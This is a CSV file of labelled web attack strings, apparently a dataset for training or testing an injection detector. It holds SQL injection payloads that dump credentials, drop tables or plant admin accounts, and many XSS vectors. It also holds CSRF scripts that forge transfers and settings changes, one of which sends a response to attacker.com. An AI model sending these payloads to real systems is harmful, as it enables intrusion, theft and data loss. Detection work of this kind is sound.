payload,label
' OR '1'='1,SQL Injection
"' UNION SELECT username, password FROM users--",SQL Injection
'; WAITFOR DELAY '0:0:5'--,SQL Injection
"' AND 1=CONVERT(int,@@version)--",SQL Injection
' AND 1=1--,SQL Injection
'; DROP TABLE users--,SQL Injection
' OR 1=1--,SQL Injection
0x27 OR 0x31=0x31--,SQL Injection
'; SELECT pg_sleep(5)--,SQL Injection
"' AND 1=CONVERT(int,USER())--",SQL Injection
"' AND SUBSTRING(@@version,1,1)='5'--",SQL Injection
' OR 'a'='a,SQL Injection
' OR 1=1-- -,SQL Injection
'//OR//1=1--,SQL Injection
' OR CAST('a' AS INT)=CAST('a' AS INT)--,SQL Injection
' OR SLEEP(5)--,SQL Injection
"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",SQL Injection
"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",SQL Injection
'; SELECT pg_sleep(10)--,SQL Injection
' OR 1=1#,SQL Injection
' OR SLEEP(10)--,SQL Injection
"' UNION SELECT NULL, NULL, username, password FROM users--",SQL Injection
' OR 1=1/*,SQL Injection
' AND (SELECT COUNT(*) FROM users) > 0--,SQL Injection
' OR pg_sleep(7)--,SQL Injection
"' UNION SELECT database(), NULL--",SQL Injection
'; WAITFOR DELAY '0:0:10'--,SQL Injection
' OR CAST(1 AS INT)=1--,SQL Injection
"' OR SUBSTRING(user(),1,1)='r'--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,SQL Injection
"' UNION SELECT table_name, NULL FROM information_schema.tables--",SQL Injection
' OR (SELECT sleep(5))--,SQL Injection
' OR 0x61646d696e=0x61646d696e--,SQL Injection
' OR SLEEP(5)#,SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR pg_sleep(3)--,SQL Injection
'; WAITFOR DELAY '0:0:3'--,SQL Injection
"' OR SUBSTRING(@@version,1,1)='5'--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,SQL Injection
"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",SQL Injection
' OR SLEEP(8)/*,SQL Injection
"' UNION SELECT table_name, NULL FROM information_schema.tables--",SQL Injection
"' OR SUBSTRING(user(),1,1)='a'/*",SQL Injection
'; UPDATE users SET password='hacked' WHERE username='admin'--,SQL Injection
' OR pg_sleep(6)/*,SQL Injection
"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",SQL Injection
' OR CAST('1' AS INT)=1--,SQL Injection
'; WAITFOR DELAY '0:0:7'/*,SQL Injection
"' OR SUBSTRING(@@version,1,1)='8'#",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,SQL Injection
'; DELETE FROM users WHERE username='guest'--,SQL Injection
' OR 0x31=0x31--,SQL Injection
' OR SLEEP(9)#,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(4)#,SQL Injection
' OR CAST(1 AS INT)=1/*,SQL Injection
"' OR SUBSTRING(user(),1,1)='b'/*",SQL Injection
"' UNION SELECT database(), NULL--",SQL Injection
"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",SQL Injection
'; WAITFOR DELAY '0:0:5'#,SQL Injection
"' OR SUBSTRING(@@version,1,1)='9'#",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,SQL Injection
'; DROP TABLE sessions--,SQL Injection
' OR 0x41=0x41--,SQL Injection
' OR SLEEP(11)--,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(12)--,SQL Injection
'; UPDATE users SET password='newpass' WHERE username='admin'--,SQL Injection
' OR SLEEP(12)--,SQL Injection
"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",SQL Injection
"' OR SUBSTRING(user(),1,1)='c'--",SQL Injection
"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",SQL Injection
' OR pg_sleep(8)--,SQL Injection
"' UNION SELECT @@version, NULL--",SQL Injection
' OR CAST('1' AS INT)=1--,SQL Injection
'; WAITFOR DELAY '0:0:8'--,SQL Injection
"' OR SUBSTRING(@@version,1,1)='7'--",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,SQL Injection
'; DELETE FROM users WHERE username='admin'--,SQL Injection
' OR 0x42=0x42--,SQL Injection
' OR SLEEP(13)--,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(14)--,SQL Injection
' OR CAST(1 AS INT)=1--,SQL Injection
"' OR SUBSTRING(user(),1,1)='d'--",SQL Injection
"' UNION SELECT database(), NULL--",SQL Injection
"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",SQL Injection
'; WAITFOR DELAY '0:0:9'--,SQL Injection
"' OR SUBSTRING(@@version,1,1)='6'--",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,SQL Injection
'; DROP TABLE sessions--,SQL Injection
' OR 0x43=0x43--,SQL Injection
' OR SLEEP(14)--,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(15)--,SQL Injection
'; UPDATE users SET password='securepass' WHERE username='admin'--,SQL Injection
<script>alert('XSS1')</script>,XSS
<img src=x onerror=alert('XSS2')>,XSS
<script>alert('XSS3')</script>,XSS
"<a href='javascript:alert(""XSS4"")'>click</a>",XSS
<input autofocus onfocus=alert('XSS5')>,XSS
"<iframe src='javascript:alert(""XSS6"")'></iframe>",XSS
<svg onload=alert('XSS7')>,XSS
<body onload=alert('XSS8')>,XSS
<div onclick=alert('XSS9')>Click me</div>,XSS
"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",XSS
"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",XSS
%3Cscript%3Ealert('XSS12')%3C/script%3E,XSS
<span onmouseover=alert('XSS13')>Hover me</span>,XSS
"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",XSS
"<object data='javascript:alert(""XSS15"")'></object>",XSS
<form onsubmit=alert('XSS16')><input type='submit'></form>,XSS
<video src=x onerror=alert('XSS17')></video>,XSS
<audio src=x onerror=alert('XSS18')></audio>,XSS
<textarea onfocus=alert('XSS19')>Focus me</textarea>,XSS
"<math href='javascript:alert(""XSS20"")'>X</math>",XSS
"<base href=""javascript:alert('XSS21');//"">",XSS
"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",XSS
"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",XSS
"<button onclick='alert(""XSS24"")'>Click</button>",XSS
<form onreset=alert('XSS25')><input type='reset'></form>,XSS
<marquee onstart=alert('XSS26')>Scrolling text</marquee>,XSS
"<embed src='javascript:alert(""XSS27"")'>",XSS
"<bgsound src='javascript:alert(""XSS28"")'>",XSS
<xml onload=alert('XSS29')>,XSS
"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",XSS
<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,XSS
"<base href=""javascript:alert('XSS32');//"">",XSS
<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,XSS
"<div onpointerover='alert(""XSS34"")'>Hover me</div>",XSS
<script>alert(XSS35)</script>,XSS
<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,XSS
"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",XSS
"<input oninput='alert(""XSS38"")'>",XSS
<script>eval(alert('XSS39'))</script>,XSS
"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",XSS
"<span onpointerdown='alert(""XSS41"")'>Click me</span>",XSS
"<math href='javascript:alert(""XSS42"")'>X</math>",XSS
"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",XSS
"<video oncanplay='alert(""XSS44"")'></video>",XSS
"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",XSS
"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",XSS
"<script>setTimeout('alert(""XSS47"")',0)</script>",XSS
"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",XSS
"<input formaction='javascript:alert(""XSS49"")' type='submit'>",XSS
"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",XSS
"<script>setInterval(function(){alert('XSS51')},1000)</script>",XSS
"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",XSS
"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",XSS
"<iframe src='javascript:alert(""XSS54"")'></iframe>",XSS
"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",XSS
"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",XSS
"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",XSS
"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",XSS
"<script>Function('alert(""XSS59"")')()</script>",XSS
"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",XSS
<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,XSS
"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",XSS
"<math href='javascript:alert(""XSS63"")'>X</math>",XSS
"<audio src='x' onerror='alert(""XSS64"")'></audio>",XSS
"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",XSS
"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",XSS
"<input oninvalid='alert(""XSS67"")' required>",XSS
"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",XSS
"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",XSS
"<video onpause='alert(""XSS70"")'></video>",XSS
"<svg onmouseenter='alert(""XSS71"")'></svg>",XSS
"<form oninput='alert(""XSS72"")'><input></form>",XSS
"<svg onwheel='alert(""XSS73"")'></svg>",XSS
"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",XSS
"<svg onanimationend='alert(""XSS75"")'></svg>",XSS
"<audio onplay='alert(""XSS76"")'></audio>",XSS
"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",XSS
"<iframe seamless onload='alert(""XSS78"")'></iframe>",XSS
"<svg oncut='alert(""XSS79"")'></svg>",XSS
"<svg oncopy='alert(""XSS80"")'></svg>",XSS
"<svg onpaste='alert(""XSS81"")'></svg>",XSS
"<svg onreset='alert(""XSS82"")'></svg>",XSS
"<svg onsearch='alert(""XSS83"")'></svg>",XSS
"<svg onselect='alert(""XSS84"")'></svg>",XSS
"<svg onshow='alert(""XSS85"")'></svg>",XSS
"<svg ontoggle='alert(""XSS86"")'></svg>",XSS
"<svg ontransitionend='alert(""XSS87"")'></svg>",XSS
"<svg onunload='alert(""XSS88"")'></svg>",XSS
"<svg onvolumechange='alert(""XSS89"")'></svg>",XSS
"<svg onwaiting='alert(""XSS90"")'></svg>",XSS
"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",XSS
"<svg onpointercancel='alert(""XSS92"")'></svg>",XSS
"<svg onpointerout='alert(""XSS93"")'></svg>",XSS
"<svg onpointerover='alert(""XSS94"")'></svg>",XSS
"<svg onpointerup='alert(""XSS95"")'></svg>",XSS
"<svg onselectstart='alert(""XSS96"")'></svg>",XSS
"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",XSS
"<svg onstalled='alert(""XSS98"")'></svg>",XSS
"<svg onsubmit='alert(""XSS99"")'></svg>",XSS
"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>",XSS
<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,Suspicious Activity
<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,Suspicious Activity
"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",Suspicious Activity
"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",Suspicious Activity
<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,Suspicious Activity
<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,Suspicious Activity
<script src='https://attacker.com/csrf-trigger.js'></script>,Suspicious Activity
"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Suspicious Activity
<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Suspicious Activity
"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",Suspicious Activity
"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Suspicious Activity
"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",Suspicious Activity
<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",Suspicious Activity
<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",Suspicious Activity
<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>",Suspicious Activity
"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",Suspicious Activity
"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",Suspicious Activity
<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",Suspicious Activity
<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Suspicious Activity
"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",Suspicious Activity
<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Suspicious Activity
"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",Suspicious Activity
<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",Suspicious Activity
"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Suspicious Activity
"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",Suspicious Activity
<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,Suspicious Activity
<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,Suspicious Activity
"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",Suspicious Activity
"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",Suspicious Activity
"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Suspicious Activity
"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",Suspicious Activity
"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",Suspicious Activity
"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",Suspicious Activity
"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",Suspicious Activity
"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",Suspicious Activity
"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",Suspicious Activity
<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,Suspicious Activity
"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",Suspicious Activity
"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",Suspicious Activity
"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",Suspicious Activity
"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Suspicious Activity
<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,Suspicious Activity
